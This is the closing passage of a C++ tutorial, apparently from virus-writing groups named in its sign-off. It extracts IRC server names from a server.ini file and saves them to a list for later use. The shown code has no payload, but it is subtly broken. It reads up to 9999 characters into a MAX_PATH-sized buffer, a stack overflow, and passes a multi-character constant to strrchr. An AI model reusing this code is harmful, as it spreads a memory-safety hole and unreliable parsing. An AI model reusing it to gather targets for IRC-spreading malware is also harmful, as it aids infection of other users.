    //This void is used to search the server.ini file and to extract all the IRC servers from it.
	static char Line[MAX_PATH];
	char Server[256];

	ifstream a(File); //Open the server.ini file
	while (!a.eof()) //Search until the end of the file is reached
	{
		a.getline(Line,9999,'\n'); //Get the first line of the file
		if (strstr(Line, "SERVER:")==0)  //Check if the string "SERVER:" is in the line
		{
		}
		else
		{
			for(int i = 0; i < 2; i++) //If it is, then remove erveything until we only get the pure IRC server
			{
				char *Cutoff = NULL;
				std::string File;
				std::string Cut;

				Cutoff = strrchr(Line,'VER:');
				*(Cutoff) = '\0';

				File=Line;
				Cut=File.substr(File.rfind(':')+1);
				strcpy(Server, Cut.c_str());
			}
			FillServerArray(Server); //Add it to the array with servers
		}
	}
	a.close(); //Close the file for reading
}
void FillServerArray(LPCSTR Server)
{
   char ChosenServer[256];

   lstrcpy(ServerArray[ServerCount],Server); //This will add the found server to the array with servers
   ServerCount++;

   strcpy(ChosenServer, Server);
   strcat(ChosenServer, "\n"); //Adds a new line to the string
   ofstream c(ServersList, ios::app);
   c<< ChosenServer; //This will write the server to an text file so we can use it later
   c.close(); //Closes the file for writing
}

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Well this was all of it, I hope you learned something from it or that it was
    useful to you, if you have any comments or questions then contact me.

    Greetz are going to Evil_Self, Mr. X, Kernel32, BlueOwl, Kefi, Retro,
    Gigabyte and to all the members of the Indovirus Network, BlackGate and rRLF.

                                    [EOF]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/


  
 

